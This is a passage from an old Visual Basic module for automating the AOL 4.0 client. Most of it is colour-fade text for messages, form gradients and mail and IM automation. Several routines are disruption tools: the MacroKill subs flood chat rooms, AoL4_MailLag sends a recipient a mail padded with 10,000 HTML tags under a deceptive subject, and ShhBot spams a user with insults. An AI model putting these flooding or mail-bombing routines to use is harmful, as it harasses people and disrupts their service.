        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function
Function AoL4_ImGreenRedGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreenYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreenYellowGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & "></b>" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function
Function AoL4_ImGreyBlack(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 220 / A
        f = E * B
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyBlackGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyBlue(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyBlueGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyGreen(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyGreenGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyPurple(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyPurpleGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyRed(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyRedGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyYellow(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Function AoL4_ImGreyYellowGrey(who, txt)
A = Len(txt)
    For B = 1 To A
        C = Left(txt, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
     InstantMessage (who), ("" + Msg + "")
End Function

Sub AoL4_MacroKill1()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 99
A = A & "@"
Next
SendChat "" & A
Timeout 0.1
SendChat "" & A
End Sub

Sub AoL4_MacroKill2()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 99
A = A & "%"
Next
SendChat "" & A
Timeout 0.1
SendChat "" & A
End Sub


Sub AoL4_MacroKill3()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 99
A = A & "#"
Next
SendChat "" & A
Timeout 0.1
SendChat "" & A
End Sub


Sub AoL4_MacroKill4()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 99
A = A & "$"
Next
SendChat "" & A
Timeout 0.1
SendChat "" & A
End Sub
Sub AoL4_MacroKill5()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 99
A = A & "!"
Next
SendChat "" & A
Timeout 0.1
SendChat "" & A
End Sub
Sub AoL4_MacroKill6()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 99
A = A & "^"
Next
SendChat "" & A
Timeout 0.1
SendChat "" & A
End Sub
Sub AoL4_MacroKill7()
SendKeys "{enter}"
SendKeys "{enter}"
For i = 1 To 99
A = A & "*"
Next
SendChat "" & A
Timeout 0.1
SendChat "" & A
End Sub

Sub AoL4_MailLag(ScreenNames)
For i = 1 To 10000
A = A + "<html></html>"
Next
AoL4_MailSend (ScreenNames), ("Important Message About Chat Rooms"), ("JeRmZ OwNz YoU" & A)
End Sub

Sub AoL4_MailSend(SN, Subject, Message)
meeh% = FindIt(AoL4_Windo(), "AOL Toolbar")
Toolbar% = FindIt(meeh%, "_AOL_Toolbar")
Receive% = FindIt(Toolbar%, "_AOL_Icon")
Receive% = GetWindow(Receive%, GW_HWNDNEXT)
Call Click(Receive%)
Do: DoEvents
mail% = FindItsTitle(AoL4_Child(), "Write Mail")
Edit% = FindIt(mail%, "_AOL_Edit")
Rich% = FindIt(mail%, "RICHCNTL")
Receive% = FindIt(mail%, "_AOL_ICON")
Loop Until mail% <> 0 And Edit% <> 0 And Rich% <> 0 And Receive% <> 0
Call SenditByString(Edit%, WM_SETTEXT, 0, SN)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Call SenditByString(Edit%, WM_SETTEXT, 0, Subject)
Call SenditByString(Rich%, WM_SETTEXT, 0, Message)
For GetIcon = 1 To 18
Receive% = GetWindow(Receive%, GW_HWNDNEXT)
Next GetIcon
Call Click(Receive%)
End Sub
Function AoL4_Child()
AOL% = FindWindow("AOL Frame25", vbNullString)
AoL4_Child = FindIt(AOL%, "MDIClient")
End Function


Function AoL4_Windo()
AOL% = FindWindow("AOL Frame25", vbNullString)
AoL4_Win = AOL%
End Function
Sub AoL4_SendIm(Recipiant, Message)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
Call AOL4_Keyword("im")
Do: DoEvents
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
AOEdit% = FindIt(IMWin%, "_AOL_Edit")
AORich% = FindIt(IMWin%, "RICHCNTL")
AOIcon% = FindIt(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SenditByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SenditByString(AORich%, WM_SETTEXT, 0, Message)
For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X
Call Timeout(0.01)
Click (AOIcon%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindIt(AOL%, "MDIClient")
IMWin% = FindItsTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop
End Sub
Sub Form_CircleBlue(Frm As Object)
Dim X
Dim Y
Dim Red
Dim Blue
X = Frm.Width
Y = Frm.Height
Frm.FillStyle = 0
Red = 0
Blue = Frm.Width
Do Until Red = 255
Red = Red + 1
Blue = Blue - Frm.Width / 255 * 1
Frm.FillColor = RGB(0, 0, Red)
If Blue < 0 Then Exit Do
Frm.Circle (Frm.Width / 2, Frm.Height / 2), Blue, RGB(0, 0, Red)
Loop
End Sub

Sub Form_CircleFire(Frm As Object)
Dim X
Dim Y
Dim Red
Dim Blue
X = Frm.Width
Y = Frm.Height
Frm.FillStyle = 0
Red = 0
Blue = Frm.Width
Do Until Red = 255
Red = Red + 1
Blue = Blue - Frm.Width / 255 * 1
Frm.FillColor = RGB(255, Red, 0)
If Blue < 0 Then Exit Do
Frm.Circle (Frm.Width / 2, Frm.Height / 2), Blue, RGB(255, Red, 0)
Loop
End Sub
Sub Form_FadeBlue(Frm As Object)
Dim X
Dim Y
Dim Red
Dim Green
Dim Blue
X = Frm.Width
Y = Frm.Height
Red = 255
Green = 255
Blue = 255
Do Until Red = 0
Y = Y - Frm.Height / 255 * 1
Red = Red - 1
Frm.Line (0, 0)-(X, Y), RGB(0, 0, Red), BF
Loop
End Sub
Sub Form_FadeFire(Frm As Object)
Dim X
Dim Y
Dim Red
Dim Green
Dim Blue
X = Frm.Width
Y = Frm.Height
Red = 255
Green = 255
Blue = 255
Do Until Red = 0
Y = Y - Frm.Height / 255 * 1
Red = Red - 1
Frm.Line (0, 0)-(X, Y), RGB(255, Red, 0), BF
Loop
End Sub

Sub Form_FireFade(Frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    Frm.DrawStyle = vbInsideSolid
    Frm.DrawMode = vbCopyPen
    Frm.ScaleMode = vbPixels
    Frm.DrawWidth = 2
    Frm.ScaleHeight = 256
    For intLoop = 0 To 255
    Frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255, 255 - intLoop, 0), B
    Next intLoop
End Sub


Sub Form_GreenFade(Frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    Frm.DrawStyle = vbInsideSolid
    Frm.DrawMode = vbCopyPen
    Frm.ScaleMode = vbPixels
    Frm.DrawWidth = 2
    Frm.ScaleHeight = 256
    For intLoop = 0 To 255
    Frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub


Sub Form_IceFade(Frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    Frm.DrawStyle = vbInsideSolid
    Frm.DrawMode = vbCopyPen
    Frm.ScaleMode = vbPixels
    Frm.DrawWidth = 2
    Frm.ScaleHeight = 256
    For intLoop = 0 To 255
    Frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 255), B
    Next intLoop
End Sub

Sub Form_RedFade(Frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    Frm.DrawStyle = vbInsideSolid
    Frm.DrawMode = vbCopyPen
    Frm.ScaleMode = vbPixels
    Frm.DrawWidth = 2
    Frm.ScaleHeight = 256
    For intLoop = 0 To 255
    Frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub


Sub Form_SilverFade(Frm As Object)
    On Error Resume Next
    Dim intLoop As Integer
    Frm.DrawStyle = vbInsideSolid
    Frm.DrawMode = vbCopyPen
    Frm.ScaleMode = vbPixels
    Frm.DrawWidth = 2
    Frm.ScaleHeight = 256
    For intLoop = 0 To 255
    Frm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub


Sub Form_CircleGreen(Frm As Object)
Dim X
Dim Y
Dim Red
Dim Blue
X = Frm.Width
Y = Frm.Height
Frm.FillStyle = 0
Red = 0
Blue = Frm.Width
Do Until Red = 255
Red = Red + 1
Blue = Blue - Frm.Width / 255 * 1
Frm.FillColor = RGB(0, Red, 0)
If Blue < 0 Then Exit Do
Frm.Circle (Frm.Width / 2, Frm.Height / 2), Blue, RGB(0, Red, 0)
Loop
End Sub
Sub Form_CircleRedFlare(Frm As Object)
Dim X
Dim Y
Dim Red
Dim Blue
X = Frm.Width
Y = Frm.Height
Frm.FillStyle = 0
Red = 0
Blue = Frm.Width
Do Until Red = 255
Red = Red + 5
Blue = Blue - Frm.Width / 255 * 10
Frm.FillColor = RGB(Red, 0, 0)
If Blue < 0 Then Exit Do
Frm.Circle (Frm.Width / 2, Frm.Height / 2), Blue, RGB(255, Red, 0)
Loop
End Sub
Sub StayOnTop(theform As Form)
    Call SetWindowPos(theform.hwnd, HWND_TOPMOST, 0, 0, 0, 0, Flags)
End Sub
Sub AddStringToList(theitems, TheList As ListBox)
If Not Mid(theitems, Len(theitems), 1) = "," Then
theitems = theitems & ","
End If

For DoList = 1 To Len(theitems)
thechars$ = thechars$ & Mid(theitems, DoList, 1)

If Mid(theitems, DoList, 1) = "," Then
TheList.AddItem Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
If Mid(theitems, DoList + 1, 1) = " " Then
DoList = DoList + 1
End If
End If
Next DoList

End Sub

Sub SendMail(Recipiants, Subject, Message)
'SendMail Text1.Text, Text2.Text, Text3.Text
'make 3 text boxes text1 = Name text2 = Subject text3 = Msg
 
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Subject)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Message)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
Sub ClickIcon(Button%)
SendNow% = SenditbyNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SenditbyNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub
Sub ShhBot()
If SNFromLastChatLine = Text1.Text Then
Do: DoEvents
SendChat ("STFU " & SNFromLastChatLine & "!")
Loop Until SNFromLastChatLine = Text1.Text
End If
End Sub

Function SendIM(person As String, Message As String)
    Dim AOL As Long, MDI As Long, Im As Long, Rich As Long
    Dim SendButton As Long, OK As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call Keyword("aol://9293:" & person$)
    Do
        DoEvents
        Im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(Im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(Im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(Im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until Im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMEssageByString(Rich&, WM_SETTEXT, 0&, Message$)
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OK& = FindWindow("#32770", "America Online")
        Im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until OK& <> 0& Or Im& = 0&
    If OK& <> 0& Then
        Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(Im&, WM_CLOSE, 0&, 0&)
    End If
End Function
Function Purple_LBlue_Purple()
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    Purple_LBlue = Msg
End Function


Function PurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 200 / A
        f = E * B
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PurpleWhite = Msg
End Function


Function PurpleWhitePurple(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PurpleWhitePurple = Msg
End Function

Function r_elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If Crapp% > 0 Then GoTo Greed

If NextChr$ = "A" Then Let NextChr$ = "/\"
If NextChr$ = "a" Then Let NextChr$ = "å"
If NextChr$ = "B" Then Let NextChr$ = "ß"
If NextChr$ = "C" Then Let NextChr$ = "Ç"
If NextChr$ = "c" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "Ð"
If NextChr$ = "d" Then Let NextChr$ = "ð"
If NextChr$ = "E" Then Let NextChr$ = "Ê"
If NextChr$ = "e" Then Let NextChr$ = "è"
If NextChr$ = "f" Then Let NextChr$ = "ƒ"
If NextChr$ = "H" Then Let NextChr$ = "|-|"
If NextChr$ = "I" Then Let NextChr$ = "‡"
If NextChr$ = "i" Then Let NextChr$ = "î"
If NextChr$ = "k" Then Let NextChr$ = "|‹"
If NextChr$ = "L" Then Let NextChr$ = "£"
If NextChr$ = "M" Then Let NextChr$ = "]V["
If NextChr$ = "m" Then Let NextChr$ = "^^"
If NextChr$ = "N" Then Let NextChr$ = "/\/"
If NextChr$ = "n" Then Let NextChr$ = "ñ"
If NextChr$ = "O" Then Let NextChr$ = "Ø"
If NextChr$ = "o" Then Let NextChr$ = "ö"
If NextChr$ = "P" Then Let NextChr$ = "¶"
If NextChr$ = "p" Then Let NextChr$ = "Þ"
If NextChr$ = "r" Then Let NextChr$ = "®"
If NextChr$ = "S" Then Let NextChr$ = "§"
If NextChr$ = "s" Then Let NextChr$ = "$"
If NextChr$ = "t" Then Let NextChr$ = "†"
If NextChr$ = "U" Then Let NextChr$ = "Ú"
If NextChr$ = "u" Then Let NextChr$ = "µ"
If NextChr$ = "V" Then Let NextChr$ = "\/"
If NextChr$ = "W" Then Let NextChr$ = "VV"
If NextChr$ = "w" Then Let NextChr$ = "vv"
If NextChr$ = "X" Then Let NextChr$ = "X"
If NextChr$ = "x" Then Let NextChr$ = "×"
If NextChr$ = "Y" Then Let NextChr$ = "¥"
If NextChr$ = "y" Then Let NextChr$ = "ý"
If NextChr$ = "!" Then Let NextChr$ = "¡"
If NextChr$ = "?" Then Let NextChr$ = "¿"
If NextChr$ = "." Then Let NextChr$ = "…"
If NextChr$ = "," Then Let NextChr$ = "‚"
If NextChr$ = "1" Then Let NextChr$ = "¹"
If NextChr$ = "%" Then Let NextChr$ = "‰"
If NextChr$ = "2" Then Let NextChr$ = "²"
If NextChr$ = "3" Then Let NextChr$ = "³"
If NextChr$ = "_" Then Let NextChr$ = "¯"
If NextChr$ = "-" Then Let NextChr$ = "—"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "<" Then Let NextChr$ = "«"
If NextChr$ = ">" Then Let NextChr$ = "»"
If NextChr$ = "*" Then Let NextChr$ = "¤"
If NextChr$ = "`" Then Let NextChr$ = "“"
If NextChr$ = "'" Then Let NextChr$ = "”"
If NextChr$ = "0" Then Let NextChr$ = "º"
Let newsent$ = newsent$ + NextChr$

Greed:
If Crapp% > 0 Then Let Crapp% = Crapp% - 1
DoEvents
Loop
SendChat (newsent$)
End Function


Function r_hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "a"
If NextChr$ = "E" Then Let NextChr$ = "e"
If NextChr$ = "I" Then Let NextChr$ = "i"
If NextChr$ = "O" Then Let NextChr$ = "o"
If NextChr$ = "U" Then Let NextChr$ = "u"
If NextChr$ = "b" Then Let NextChr$ = "B"
If NextChr$ = "c" Then Let NextChr$ = "C"
If NextChr$ = "d" Then Let NextChr$ = "D"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "f" Then Let NextChr$ = "F"
If NextChr$ = "g" Then Let NextChr$ = "G"
If NextChr$ = "h" Then Let NextChr$ = "H"
If NextChr$ = "y" Then Let NextChr$ = "Y"
If NextChr$ = "j" Then Let NextChr$ = "J"
If NextChr$ = "k" Then Let NextChr$ = "K"
If NextChr$ = "l" Then Let NextChr$ = "L"
If NextChr$ = "m" Then Let NextChr$ = "M"
If NextChr$ = "n" Then Let NextChr$ = "N"
If NextChr$ = "x" Then Let NextChr$ = "X"
If NextChr$ = "p" Then Let NextChr$ = "P"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "r" Then Let NextChr$ = "R"
If NextChr$ = "s" Then Let NextChr$ = "S"
If NextChr$ = "t" Then Let NextChr$ = "T"
If NextChr$ = "w" Then Let NextChr$ = "W"
If NextChr$ = "v" Then Let NextChr$ = "V"
If NextChr$ = " " Then Let NextChr$ = " "
Let newsent$ = newsent$ + NextChr$
Loop
SendChat (newsent$)
End Function



Public Sub Keyword(KW As String)
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim Combo As Long, EditWin As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    Combo& = FindWindowEx(Toolbar&, 0&, "_AOL_Combobox", vbNullString)
    EditWin& = FindWindowEx(Combo&, 0&, "Edit", vbNullString)
    Call SendMEssageByString(EditWin&, WM_SETTEXT, 0&, KW$)
    Call SendMessageLong(EditWin&, WM_CHAR, VK_SPACE, 0&)
    Call SendMessageLong(EditWin&, WM_CHAR, VK_RETURN, 0&)
End Sub
Sub Anti45MinTimer()
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub IMKeyword(Recipiant, Message)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

Call Keyword("aol://9293:")

Do: DoEvents
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMEssageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call Timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin% = FindChildByTitle(MDI%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", "AsKaRs")
End Sub

Sub IMsOn()
Call IMKeyword("$IM_ON", "AsKaRs")
End Sub

Function IsUserOnline()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function

Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub
Sub KillModal()
Modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_CLOSE, 0, 0)
End Sub


Sub killwait()

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call Timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
KeyWordWin% = FindChildByTitle(MDI%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

